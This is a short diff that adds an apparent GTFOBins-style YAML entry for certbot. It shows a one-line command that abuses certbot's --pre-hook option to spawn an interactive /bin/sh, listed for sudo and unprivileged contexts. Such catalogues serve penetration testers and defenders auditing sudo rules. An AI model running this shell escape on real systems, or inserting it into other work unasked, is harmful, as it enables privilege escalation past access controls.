@@ -1,0 +1,11 @@
+---
+functions:
+  shell:
+  - code: |-
+      certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
+    comment: |-
+      This needs a writable directory, replace `.` if needed.
+    contexts:
+      sudo:
+      unprivileged:
+...
